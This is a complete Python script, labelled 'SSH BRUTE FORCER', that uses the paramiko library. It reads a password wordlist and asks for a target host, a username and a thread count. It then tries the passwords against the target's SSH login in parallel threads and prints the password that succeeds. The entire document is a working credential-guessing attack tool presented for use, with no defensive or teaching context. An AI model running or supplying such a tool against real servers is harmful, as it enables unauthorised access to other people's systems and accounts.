from paramiko import *
import queue
import threading
import time
import sys


wordqueue = queue.Queue()

ssh = SSHClient()

ssh.set_missing_host_key_policy(AutoAddPolicy())

def get_info():

    while True:
        print("Enter Wordlist:")
        try:
            wordlist = str(input(">>> "))
            if ".txt" not in wordlist:
                wordlist = wordlist + ".txt"
                break

            elif wordlist == "":
                print("INVALID INPUT")

            else:
                break
           
        except:
            print("INVALID INPUT")

           

    while True:
        print("Enter Hostname / IP:")
        try:
            target_ip = str(input(">>> "))

            if target_ip == "":
                print("INVALID INPUT")

            else:
                break
           
        except:
            print("INVALID INPUT")

    while True:
        print("Enter Username:")
        try:
            target_user = str(input(">>> "))


            if target_user == "":
                print("INVALID INPUT")

            else:
                break
           
        except:
            print("INVALID INPUT")


    while True:
        print("Enter Number of threads:")
        try:
            num_threads = int(input(">>> "))


            if num_threads < 1:
                print("INVALID INPUT")

            else:
                break
           
        except:
            print("INVALID INPUT")



    return wordlist , target_ip ,target_user , num_threads


   




def attack():

    while not wordqueue.empty():

        word = wordqueue.get()

        try:


            ssh.connect(hostname = target_ip , username = target_user , password = word)
            print(f"USERNAME : {target_user}")
            print(f"PASSWORD : {word}")


            wordqueue.queue.clear()
            break

        except AuthenticationException:
            continue

        except:
            print("FAILED TO CONNECT : THREAD WILL SLEEP FOR 1 MINUTE ")
            time.sleep(60)
            continue



print("SSH BRUTE FORCER")


while True:

    print("")


    wordlist , target_ip , target_user ,num_threads = get_info()

    try:
        file = open(wordlist , "r")

        for line in file:
            wordqueue.put(line.strip())

        for i in range(num_threads):
            t = threading.Thread(target = attack , args = (),)
            t.start()

        while True:
            if wordqueue.empty():
                time.sleep(3)
                break
            else:
                continue

    

        
    except FileNotFoundError:
        print(f"NO FILE IN DIRECTORY CALLED {wordlist}")

    while True:
        print("Press any key to continue , Q to quit")

        furtherAttacks = str(input(">>> "))

        if furtherAttacks.upper() == "Q":
            sys.exit()

        else:
            break

        
        
    


